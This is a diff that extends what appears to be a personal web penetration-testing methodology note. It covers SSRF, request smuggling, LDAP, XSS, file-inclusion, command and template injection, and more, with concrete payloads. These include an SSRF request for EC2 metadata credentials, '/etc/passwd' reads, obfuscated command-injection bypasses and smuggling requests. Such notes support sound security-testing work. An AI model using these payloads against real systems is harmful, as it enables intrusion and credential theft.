@@ -87,6 +87,8 @@ Identify:
 List objects: `aws s3 ls s3://<bucket-name>`
 Upload: `aws s3 cp arbitrary-file s3://bucket-name/path-to-save`
 Remove: `aws s3 rm s3://bucket-name/object-to-remove`
+
+RFI attack: `DocumentPath=doucment.pdf&DocumentUrl=/uploads/user/blafasel/` -> `DocumentPath=aws.dat&DocumentUrl=http://0xA9FEA9FE/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`
 ##### Azure
 Identify:
 	`ACCOUNT.blob.core.windows.net`
@@ -107,6 +109,15 @@ Further info: about:cache (Firefox)
 [KnowledgeBase - TLS](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F08%20-%20TLS)
 - Subject Alternate Name (SAN) should match the system hostname
 - Automate testing with nmap, sslscan, or sslyze
+#### Server-Side Includes (SSI)
+Disabled by default (`exec` directive). Allows to change returned HTML dynamically with simple and small pieces of code.
+How to identify if enabled:
+- Existance of `.shtml` files or
+- SSI directives in server-side code #whitebox 
+- Inject SSI into potential injection points
+	- `<!--#echo var="VAR" -->`
+	- `<!--#include virtual="FILENAME" -->` (shows content of file or output of CGI script, depending on the file type)
+	- `<!--#exec cmd="OS_COMMAND" -->`
 
 ### Network Components
 #### Reverse Proxy
@@ -150,8 +161,20 @@ Portscanning or triggering SQLi
 - PHP often uses MySQL or PostgreSQL
 - APEX often uses Oracle
 #### SQL Injections
-AUSPROBIEREN: wfuzz
-### Web Servers
+Yet to evaluate: wfuzz
+> [!important] Do not test in production environments! Even simple statements like `OR 1==1` could end up in more queries that anticipated and change data
+
+[KnowledgeBase - SQLi](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F08%20-%20SQL%20Injection)
+
+And specific OWASP guides, depending on the used DMBS:
+- [Testing for Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle)
+- [Testing for MySQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL)    
+- [Testing for SQL Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server)
+- [Testing PostgreSQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL)
+- [Testing for MS Access](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access)
+- [Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
+- [Testing for ORM Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection)
+- [Testing for Client-side Web SQL Database](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side)
 ### CMS
 #### Wordpress
 ```bash
@@ -240,10 +263,18 @@ Can I circumvent checks abusing the Windows 8.3 legacy filename handling?
 	- `two.txt` -> `TWO~1.txt`
 	- `filenamewithoutextension` -> `FILENA~1` or `FILENA~1.` (equivalent)
 #### Upload
+Can I change the MIME type, e.g., from text/plain to text/html?
+```http
+Content-Disposition: form-data; name="uploadfile1"; filename="\user\share\www\html\test.gif"
+Content-Type: text/html
+
+<script>alert(document.cookie)</script>
+```
 What kind of file extensions can I upload?
 Does the app logic change file extensions of uploaded files? -> Polyglots?
 Are magic bytes checked to verify that the file extension is correct for a given file?
-[Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) / [LFI / RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)?
+[Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
+[[#Local/Remote File Inclusion]]
 #### Caching Confusion
 Responses to paths with user-specific data usually contain do-not-cache headers.
 Do the following URIs resolve to `https://example.com/home`?
@@ -251,6 +282,53 @@ Do the following URIs resolve to `https://example.com/home`?
 - `https://example.com/home/nonexistant.css`
 Then, we might lure a victim to one of these URIs, which will likely cache his personal data and make it available to us on this same URI.
 #whitebox Is caching dependant on some Regex or file extensions, instead of the set do-not-cache headers?
+
+### Parameters
+#### HTTP Parameter Pollution (HPP)
+Insert duplicate or unexpected HTTP or query parameters
+##### Server-side HPP
+If the same parameter is used multiple times, different webservers return different data
+-> Same behavior between paths
+
+Can be used to bypass filters, WAFs, or business logic.
+To identify:
+Send one request with a valid, one with an invalid, and one with both parameter values. If the response differs between all three, HPP is possible.
+```http
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{
+  "search_string": "kittens",
+  "search_string": "puppies"
+}
+```
+or `https://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies`
+
+Also, try: `&param[0]=a&param[1]=b`
+
+| Web Application Server Backend               | Parsing Result                            |
+| -------------------------------------------- | ----------------------------------------- |
+| ASP.NET / IIS                                | All occurrences concatenated with a comma |
+| ASP / IIS                                    | All occurrences concatenated with a comma |
+| .NET Core 3.1 / Kestrel                      | All occurrences concatenated with a comma |
+| .NET 5 / Kestrel                             | All occurrences concatenated with a comma |
+| PHP / Apache                                 | Last occurrence only                      |
+| PHP / Zeus                                   | Last occurrence only                      |
+| JSP, Servlet / Apache Tomcat                 | First occurrence only                     |
+| JSP, Servlet / Oracle Application Server 10g | First occurrence only                     |
+| JSP, Servlet / Jetty                         | First occurrence only                     |
+| IBM Lotus Domino                             | Last occurrence only                      |
+| IBM HTTP Server                              | First occurrence only                     |
+| Node.js / express                            | First occurrence only                     |
+| mod_perl, libapreq2 / Apache                 | First occurrence only                     |
+| Perl CGI / Apache                            | First occurrence only                     |
+| mod_wsgi (Python) / Apache                   | First occurrence only                     |
+| Python / Zope                                | All occurrences in List data type         |
+(Source: Appsec EU 2009 Carettoni & Paola)
+##### Client Side HPP
+If HTTP parameters are used in client-side code, e.g., inserted into an href, check whether `%26` is reflected url-decoded
+Example: `par=val%26action=delete` could be reflected to `<a href="http://example.com?par=val&action=delete"> View </a>`
 ### HTTP Methods
 To list supported methods:
 ```http
@@ -346,6 +424,59 @@ Could bypass IP-based ACLs, Identity/Authentication checks performed at the edge
 - HTTP Public Key Pinning (HPKP)
 - X-Frame-Options: ALLOW-FROM
 
+#### Host Header Injection
+If we set `Host: www.attacker.com` or `X-Forwarded-Host: www.attacker.com`:
+- Does the webserver redirect us ?
+- Is `attacker.com` added to client-side anchors?
+- Is it used for the generated password reset links?
+Can we access internal sites by setting the Host header to intranet.example.com? E.g. in Virtual Hosts in a split-horizon DNS setup#### HTTP Response Splitting Attacks
+If user input is passed to a response header and does not sanitize `\r\n`, we can split the HTTP response in two, allowing to insert our own body into the first response.
+Example: The Location header of a 302 reflects the interface parameter, e.g., `Location: https://victim.com/main.jsp?interface=advanced`
+-> `advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`
+#### HTTP Response Smuggling (HRS)
+See [KnowledgeBase - HTTP](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F08%20-%20Hyper%20Text%20Transfer%20Protocol)
+Mitigated with HTTP/2
+**CL.TE**
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+If vulnerable: Subsequent legitimate requests are corrupted or return unexpected responses (e.g., 404)
+
+**TE.CL**
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GET /admin HTTP/1.1
+Content-Length: 0
+
+0
+```
+If vulnerable: Remaining payload is interpreted as a new request
+**TE.TE**
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 44
+Transfer-Encoding:\tchunked
+Transfer-Encoding: identity
+
+0
+
+GET /404 HTTP/1.1
+Foo: bar
+```
 ### Authentication
 #### Basic Auth
 `WWW-Authenticate: Basic` HTTP header
@@ -397,6 +528,14 @@ Should not replace lock-out mechanisms. Common weaknesses are:
 #### Central Authentication
 May use NTLM: `WWW-Authenticate: NTLM` HTTP header
 Or hints that the users domain is relevant for auth
+##### LDAP Injection
+Queries used to authenticate or search other users. Defined in [RFC2254](https://www.ietf.org/rfc/rfc2254.txt) (LDAPv3) and [RFC1960](https://www.ietf.org/rfc/rfc1960.txt) (LDAPv2).
+Uses Polish notation: `find("name=a & pw=b")` is written as `find("(&(name=a)(pw=b))")`
+Metachars: `&` (and), `|` (or), `!` (not), `=` (equals), `~=` (approx), `>=` (greater than), `<=` (less than), `*` (any char), `()` (grouping)
+Variables: `cn` (name), `userPassword` (password)
+Example: 
+`searchlogin= "(&(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))";`
+-> submit user=`*)(uid=*))(|(uid=*` and pass=asdf
 #### SSO
 OAuth, OpenID Connect, or SAML
 [KnowledgeBase: Single Sign-On](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F03%20-%20Single%20Sign-On)
@@ -430,12 +569,131 @@ Does authorization rely on regex? See [[8_grep_cheatsheet#Web#Regex|grep regex]]
 - Do `Cache-Control` settings protect Cookies?
 
 ### Generic Inputs
-https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README #todo
+In other sections: [[#SQL Injections]] [[#LDAP Injection]] 
+#### XSS
+- Identify variables that are reflected in responses or later used on the page.
+- Assess the input they accept and the encoding that gets applied on return (if any).
 
+**Bypasses**
+- Encoding
+- `<scr<script>ipt>`
+- `?param=<script&param=>[...]</&param=script>` ([[#HTTP Parameter Pollution (HPP)]])
+[OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+
+#### Mass Assignment
+With autobinding, user-provided data is automatically used for object creation in the backend, e.g., an object of class user. If that user has an isAdmin property and autobinding is used, we can this field during user creation to get admin.
+An indicator are input names with brackets, e.g., `<input name="user[name]"...`
+**Visibility in Code** #whitebox 
+Java Spring MVC: `@RequestMapping`. 
+	Verify that controls are in place , e.g., list of bindable fields via `setAllowedFields` or list of non-bindable fields via `setDisallowedFields`. Also, check `@ModelAttribute` that allows to specify a different name/key.
+PHP Laravel Eloquent ORM: `create`
+	The latest versions of Eloquent ORM provide default protection against mass assignment vulnerabilities requiring to explicitly specify allowed attributes that can be assigned automatically, through the `$fillable` array, or attributes that have to be protected (non-bindable), trough the `$guarded` array -> Analyze classes that extend the `Model` class to identify which attributes are allowed or denied and therefore point out potential vulnerabilities.
+ASP .NET: Automatically.
+	Works with complex types and it will automatically convert the input data to the properties if the properties’ names match with the input
+	Verify that controls are in place, i.e., fields declared as `ReadOnly`, list of bindable fields via `Bind` attribute, via `includeProperties`, or via `TryUpdateModel` and list of non-bindable fields via `Bind` attribute, or via `excludeProperties`
+#### CSRF
+If CSRF not possible, check for [[#Client Side HPP]]
+
+#### Server-Side Request Forgery (SSRF)
+Trick server to perform arbitrary request. Can cause RFI, LFI, Path Traversal, RCE, ...
+##### Local/Remote File Inclusion
+If the file extension is appended to the string in the backend, we can...
+- append our extension with `%00`
+- Make our file name + extension 4096 bytes long. Many PHP installations truncate filenames longer than that without error
+Can be combined with certain PHP wrappers, if used by the app, to increase impact. Examples are:
+- *PHP Filter* allows to return PHP files to the browser through encoding them instead of executing them on the server
+  `php://filter/convert.base64-encode/resource=FILE`
+- *PHP ZIP* (included since PHP 7.2.0). Allows to use a file `internal_filename` in a zip archive located at `filename_path`. Since the archive must not have a zip extension, it may allow to bypass filters by renaming your zip with the malicious code in it to a .jpg or similar. The `#` might need to be encoded to `%23`.
+  `zip:///filename_path#internal_filename`
+- *PHP Data* (included since PHP 5.2.0, enabled with `allow_url_include`). 
+  `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==` for phpinfo
+- *PHP Expect*: Direct RCE. `expect://whoami`
+
+PHP `include()` statements happily accept URLs to files hosted somewhere too
+[PayloadsAllTheThings - LFI/RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
+
+#### Command Injection
+Perl (pipe-character): `cgi-bin/userData.pl?doc=user1.txt` -> `cgi-bin/userData.pl?doc=|/bin/ls`
+PHP (semi-colon): `something.php?dir=%3Bcat%20/etc/passwd`
+
+**Filter Bypasses:**
+Character replacement:
+	Linux: `/` -> `${PATH:0:1}` |  `;` -> `${LS_COLORS:10:1}` | `[space]` -> `${IFS}` or through brace expansion (`{ls,-la}}`)
+	Windows CMD: `\` -> `%HOMEPATH:~6,1%`
+	Windows PowerShell: `\` ->  `$env:HOMEPATH[0]`
+Command masking:
+	Linux: Characters like `\`, `$@`, or `''` do not affect the exection, e.g., is `w$@ho'a'\mi` equivalent to whoami
+	Windows CMD: `^` and `""`
+Capitalization:
+	Linux: Requires to be transferred back to normal: `;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")`
+	Windows: Works without issue `WhoaMi`
+Base64
+	Linux: `bash<<<$(base64 -d<<< d2hvYW1p)`
+#### XML Injection
+If the sink is XML, e.g., an XML DB, try to invalidate the XML:
+- If sink is within `"..."`, add `"`. Or `'` for `'...'`
+- If sink is within `<tag>...</tag>`, add `<` or open a comment with `<!--`
+- If sink is within `<!\[CDATA\[ ... ]]>`, add `]]>`
+Depending on the success of these injections, you could try different attacks:
+- `<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
+- `name</name><userid>0</userid><name>name`
+	- if the same tag appears twice, it is common that the latter is used
+	- That is not true if it is validated against an DTD that defines cardinality, e.g., with `<!ELEMENT user (name,password,userid,mail+) >`
+	- But if a previous field can be controlled, the first of duplicate fields can be removed with an opening comment
+
+Vulnerable to XXE are the following Java APIs: #whitebox 
+```
+javax.xml.parsers.DocumentBuilder
+javax.xml.parsers.DocumentBuildFactory
+org.xml.sax.EntityResolver
+org.dom4j.*
+javax.xml.parsers.SAXParser
+javax.xml.parsers.SAXParserFactory
+TransformerFactory
+SAXReader
+DocumentHelper
+SAXBuilder
+SAXParserFactory
+XMLReaderFactory
+XMLInputFactory
+SchemaFactory
+DocumentBuilderFactoryImpl
+SAXTransformerFactory
+DocumentBuilderFactoryImpl
+XMLReader
+Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
+```
+For C Code, check
+- `libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO`
+- `libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader`
+
+Also check [KnowledgeBase - XML](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F08%20-%20XML) for XEE and XXE attacks.
+##### XPath Injection
+Like [[#SQL Injections]], but for XML.
+Example login query in XPath: `string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())`
+Could be injected with `' or '1' = '1`
+Can also work blindly: [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection)
+
+#### Template Injection
+See [KnowledgeBase - RCE](obsidian://open?vault=KnowledgeBase&file=03%20-%20Content%2F08%20-%20Courses%2F08%20-%20Remote%20Command%20Execution) and the [hackmanit cheatsheet](https://cheatsheet.hackmanit.de/template-injection-table/index.html)
+universal error-based polyglot: `<%'${{/#{@}}%>{{`
+If errors are not reflexted, use universal non-error-based polyglots: `p ">[[${{1}}]]`, `<%=1%>@*#{1}`, `{##}/*{{.}}*/`
+When you see a calculated result, find out where you are: `{{this}}`, `{{this%2B''}}`, `{{constrcutor%2B''}}`, `{{constrcutor.constructor%2B''}}`, `{{eval%2B''}}`
+#### SMTP/IMAP Injection
+Only of interest when the mail server is not directly accessible, e.g., from the internet.
+Terminate previous command with `%0d%0a`, for example, assume `message_id` is used in `FETCH XXX BODY[HEADER]`, an injection could look like this:
+`read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791`
+The IMAP commands available to an unauthenticated user are: `CAPABILITY`, `NOOP`, `AUTHENTICATE`, `LOGIN`, and `LOGOUT`.
+
+#### Format String Injection
+Insert string formatting control characters, e.g., `?username=%25s%25s%25s%25n`
+**Spot in Code** #whitebox 
+Very bad on C/C++ (printf, fprintf, sprintf, snprintf) and Perl (printf and sprintf) because they can write to memory with `%n`
+Okayish on Python (str.format), but can lead to memory read, see [here](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)
+Can lead to runtime errors in Java (String.format and PrintStream.format) and PHP (printf)
 
 Continue with https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README
-
-
 ## Results
 ### App Logic
 Note down interesting facts about different paths for later evaluation. Including:
